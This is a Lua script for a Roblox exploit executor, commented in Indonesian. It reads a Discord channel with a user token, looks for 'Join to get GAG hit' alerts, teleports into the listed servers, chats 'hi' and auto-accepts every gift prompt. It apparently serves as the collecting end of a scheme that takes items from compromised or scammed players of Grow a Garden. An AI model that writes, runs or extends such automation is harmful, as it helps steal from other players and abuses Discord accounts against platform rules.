if not game:IsLoaded() then
	game.Loaded:Wait()
end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

local HttpServ = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local joinedFile = isfile("joined_ids.txt")
if not joinedFile then
    writefile("joined_ids.txt", "[]")
end

local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

-- Auto chat "hi" 3x setelah delay 5 detik
local function sendAutoChat()
    local success, err = pcall(function()
        TextChatService.TextChannels.RBXGeneral:SendAsync("hi")
        wait(5)
        TextChatService.TextChannels.RBXGeneral:SendAsync("hi")
        wait(5)
        TextChatService.TextChannels.RBXGeneral:SendAsync("hi")
    end)
    if not success then
        warn("Gagal kirim chat:", err)
    end
end
task.delay(16, sendAutoChat)

-- Auto click loading screen jika sudah selesai loading
local function autoClickLoading()
    local plr = Players.LocalPlayer
    repeat
        task.wait(1)
    until plr:GetAttribute("Loading_Screen_Finished") == true

    task.wait(1)
    -- Klik acak di tengah layar
    VirtualInputManager:SendMouseButtonClick(Vector2.new(800, 500), Enum.UserInputType.MouseButton1, true, game)
end
task.spawn(autoClickLoading)

-- Auto accept gift
local function acceptGifts()
    local guiPath = Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
    while task.wait(1) do
        for _, v in pairs(guiPath:GetChildren()) do
            if v:IsA("ImageLabel") and v:FindFirstChild("Holder") then
                local acceptBtn = v.Holder:FindFirstChild("Frame") and v.Holder.Frame:FindFirstChild("Accept")
                if acceptBtn then
                    fireclickdetector(acceptBtn) -- fallback (kalau pakai ClickDetector)
                    replicatesignal(acceptBtn.MouseButton1Click) -- preferred
                end
            end
        end
    end
end
task.spawn(acceptGifts)

-- Auto join dari notifikasi Discord
local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Join to get GAG hit") then
                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                    if placeId and jobId then
                        if not table.find(joinedIds, tostring(message.id)) then
                            saveJoinedId(tostring(message.id))
                            TeleportService:TeleportToPlaceInstance(placeId, jobId, Players.LocalPlayer)
                            return
                        end
                    end
                end
            end
        end
    else
        print("Response code is not 200. Is your token and channelid correct?")
    end
end

-- Cek notifikasi tiap 5 detik
while wait(6) do
    autoJoin()
end
